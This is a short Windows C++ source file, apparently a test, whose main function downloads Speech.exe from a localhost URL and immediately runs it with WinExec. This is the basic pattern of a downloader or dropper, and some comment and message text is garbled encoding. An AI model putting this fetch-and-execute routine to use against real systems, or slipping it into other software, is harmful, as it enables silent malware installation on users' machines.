// download1.cpp : ����Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include "download1.h"
#include <UrlMon.h>
#pragma comment(lib,"urlmon.lib")



int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{
	
	URLDownloadToFile(NULL,_T("http://localhost/test/Speech.exe"),_T("Speech.exe"),0,NULL);
	_asm nop;
	_asm nop;
	WinExec("Speech.exe",SW_SHOW);
	MessageBox(NULL,_T("��������ok"),_T("ok"),NULL);
	return 0;

}



